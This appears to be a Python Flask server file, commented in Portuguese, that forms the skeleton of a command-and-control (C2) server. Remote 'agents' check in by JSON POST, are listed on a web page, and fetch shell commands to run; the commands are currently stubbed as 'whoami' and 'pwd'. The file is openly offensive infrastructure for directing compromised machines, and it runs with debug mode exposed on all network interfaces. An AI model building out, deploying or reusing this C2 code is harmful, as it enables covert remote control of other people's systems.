from flask import Flask, request, jsonify, render_template
app = Flask(__name__)

# Lista para armazenar agentes que fazem check-in
agents = []

@app.route('/checkin', methods=['POST'])
def agent_checkin():
    if request.is_json:
        data = request.get_json()
        agents.append(data)  # Salva agente na lista
        print(f"Agente fez check-in: {data}")
        return jsonify({"status": "success", "message": "Check-in recebido!"}), 200
    return jsonify({"status": "error", "message": "Conteúdo JSON esperado."}), 400

@app.route('/agents')
def view_agents():
    return render_template('agents.html', agents=agents)


# --- Rotas para a comunicação com os agentes ---

@app.route('/get_commands/<agent_id>', methods=['GET'])
def get_commands(agent_id):

    """
    Rota para os agentes buscarem comandos pendentes.
    """
    print(f"Agente {agent_id} solicitou comandos.")
    # Aqui você chamaria sua lógica de banco de dados para buscar comandos para este agente
    # Exemplo: commands = database.get_pending_commands(agent_id)
    commands = ["whoami", "pwd"] 
    return jsonify({"commands": commands}), 200

# --- Rotas para a interface web do C2  ---

@app.route('/')
def index():
    """
    Página inicial da interface web do C2.
    Irá renderizar um template HTML.
    """
    return render_template('index.html')


if __name__ == '__main__':
    # Para rodar o servidor: python server.py
    # Debug=True permite recarregamento automático e mostra erros detalhados.
    # Em produção, você usaria um servidor WSGI como Gunicorn ou uWSGI.
    app.run(debug=True, host='0.0.0.0', port=5000)